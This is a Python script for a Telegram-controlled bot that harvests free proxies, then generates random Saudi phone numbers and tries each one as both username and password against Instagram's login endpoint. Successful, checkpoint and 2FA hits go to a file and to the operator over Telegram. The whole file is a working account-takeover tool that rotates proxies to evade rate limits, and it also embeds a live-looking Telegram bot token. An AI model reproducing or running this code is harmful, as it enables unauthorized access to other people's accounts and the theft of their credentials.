# interactive_hunter.py - v2.1 (with Live Status Dashboard)

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==============================================================================
# SECTION 0: CONFIGURATION
# ==============================================================================

TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
ADMIN_USER_ID = 1148797883

COUNTRY_CODE = "966"
OPERATOR_CODES = ["50", "55", "53", "54", "56", "58", "59"]
NUMBER_LENGTH = 7
MAX_HUNTING_THREADS = 30
HITS_FILE = "hits.txt"

# --- متغيرات جديدة لتخزين الإحصائيات الحية ---
is_hunting = False
hunt_task = None
hunt_stats = {
    "processed": 0,
    "total_targets": 0,
    "hits": 0,
    "start_time": None,
    "current_phase": "Idle"
}

# ==============================================================================
# SECTION 1: CORE LOGIC (Harvester & Instagram Hunter)
# ==============================================================================

async def the_hunt(context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_stats
    is_hunting = True
    
    # --- إعادة ضبط الإحصائيات ---
    hunt_stats = {
        "processed": 0, "total_targets": 0, "hits": 0,
        "start_time": time.time(), "current_phase": "Harvesting"
    }

    # --- الجزء الأول: جامع البروكسيات ---
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🔎 **Phase 1: Proxy Harvesting**\nStarting to scrape and check proxies...")
    
    live_proxies_list = []
    try:
        # (كود جامع البروكسيات يبقى كما هو)
        proxies_to_check_queue = queue.Queue()
        response = await asyncio.to_thread(requests.get, "https://free-proxy-list.net/", timeout=15)
        soup = BeautifulSoup(response.content, 'html.parser')
        proxy_table = soup.find("table", class_="table-striped")
        count = 0
        for row in proxy_table.tbody.find_all("tr"):
            ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
            if is_https == 'yes':
                proxies_to_check_queue.put(f"http://{ip}:{port}")
                count += 1
        if count == 0: raise Exception("No HTTPS proxies found on the source page.")
        
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"✅ Scraped {count} proxies. Now checking them...")

        def _check_proxy_worker():
            while not proxies_to_check_queue.empty():
                proxy = proxies_to_check_queue.get()
                try:
                    r = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=7)
                    if r.status_code == 200: live_proxies_list.append(proxy)
                except Exception: pass
                proxies_to_check_queue.task_done()

        threads = [threading.Thread(target=_check_proxy_worker) for _ in range(100)]
        for t in threads: t.start()
        for t in threads: t.join()

    except Exception as e:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"❌ **Error during harvesting:** {e}\nStopping hunt.")
        is_hunting = False
        return

    if not live_proxies_list:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text="❌ **Error:** No live proxies found after checking. Stopping hunt.")
        is_hunting = False
        return
        
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"✅ **Harvesting Complete!**\nFound {len(live_proxies_list)} live proxies.")

    # --- الجزء الثاني: صياد انستغرام ---
    hunt_stats["current_phase"] = "Hunting"
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🎯 **Phase 2: The Hunt**\nGenerating targets and starting attempts...")
    
    targets = []
    for op_code in OPERATOR_CODES:
        for _ in range(200):
            targets.append(f"{COUNTRY_CODE}{op_code}{''.join(random.choice('0123456789') for _ in range(NUMBER_LENGTH))}")
    random.shuffle(targets)
    hunt_stats["total_targets"] = len(targets)
    
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {len(targets)} targets. The hunt begins now!")

    for target_number in targets:
        if not is_hunting:
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text="🛑 **Hunt Stopped by User.**")
            hunt_stats["current_phase"] = "Stopped"
            return

        username = password = target_number
        proxy = random.choice(live_proxies_list)
        
        try:
            status = await asyncio.to_thread(attempt_login, username, password, proxy)
            if status != "FAIL":
                hunt_stats["hits"] += 1
                result_message = f"🎯 *HIT FOUND!* ({hunt_stats['hits']}) 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
                await context.bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
                with open(HITS_FILE, "a") as f:
                    f.write(f"{username}:{password} | Status: {status}\n")
        except Exception:
            pass

        hunt_stats["processed"] += 1

    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Hunt Finished!**\nAll targets have been attempted.")
    is_hunting = False
    hunt_stats["current_phase"] = "Finished"

def attempt_login(username, password, proxy):
    # (هذا الجزء لم يتغير)
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
    proxies_dict = {"http": proxy, "https": proxy}
    with requests.Session() as s:
        r = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=10)
        csrf = r.cookies.get('csrftoken')
        if not csrf: return "FAIL"
        headers['x-csrftoken'] = csrf
        payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}'}
        login_r = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=10)
        if login_r.status_code != 200: return "FAIL"
        data = login_r.json()
        if data.get("authenticated"): return "SUCCESS"
        if "checkpoint_url" in login_r.text: return "CHECKPOINT"
        if data.get("two_factor_required"): return "2FA"
        return "FAIL"

# ==============================================================================
# SECTION 3: TELEGRAM COMMAND HANDLERS
# ==============================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: return
    await update.message.reply_text(
        "👋 **Welcome to the Hunter Bot v2.1!**\n\n"
        "▶️ `/hunt` - Start the hunt.\n"
        "🛑 `/stophunt` - Stop the hunt.\n"
        "📊 `/status` - Get a live progress report."
    , parse_mode='Markdown')

async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_task
    if update.effective_user.id != ADMIN_USER_ID: return
    if is_hunting:
        await update.message.reply_text("⚠️ A hunt is already in progress.")
        return
    await update.message.reply_text("🚀 **Command received!** Starting the hunt process...")
    hunt_task = asyncio.create_task(the_hunt(context))

async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_task
    if update.effective_user.id != ADMIN_USER_ID: return
    if not is_hunting:
        await update.message.reply_text("ℹ️ No hunt is currently running.")
        return
    is_hunting = False
    if hunt_task: hunt_task.cancel()
    await update.message.reply_text("⏳ **Stopping...** The hunt will be terminated.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: return
    
    if not is_hunting:
        await update.message.reply_text("🅾️ **Status:** The bot is idle. Use `/hunt` to start.")
        return
    
    # --- لوحة المعلومات الحية ---
    phase = hunt_stats["current_phase"]
    processed = hunt_stats["processed"]
    total = hunt_stats["total_targets"]
    hits = hunt_stats["hits"]
    
    # حساب النسبة المئوية والوقت المنقضي
    percentage = (processed / total * 100) if total > 0 else 0
    elapsed_seconds = time.time() - hunt_stats["start_time"]
    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(elapsed_seconds))
    
    status_message = (
        f"📊 **Live Hunt Status** 📊\n\n"
        f"▪️ **Phase:** `{phase}`\n"
        f"▪️ **Progress:** {processed} / {total} accounts checked.\n"
        f"▪️ **Completion:** `{percentage:.2f}%`\n"
        f"▪️ **Successful Hits:** `{hits}`\n"
        f"▪️ **Time Elapsed:** `{elapsed_time}`"
    )
    await update.message.reply_text(status_message, parse_mode='Markdown')

# ==============================================================================
# SECTION 4: MAIN APPLICATION
# ==============================================================================

def main():
    print("--- INTERACTIVE HUNTER BOT v2.1 is starting... ---")
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("hunt", hunt_command))
    application.add_handler(CommandHandler("stophunt", stophunt_command))
    application.add_handler(CommandHandler("status", status_command))
    
    print("Bot is now listening for commands on Telegram.")
    application.run_polling()

if __name__ == "__main__":
    main()
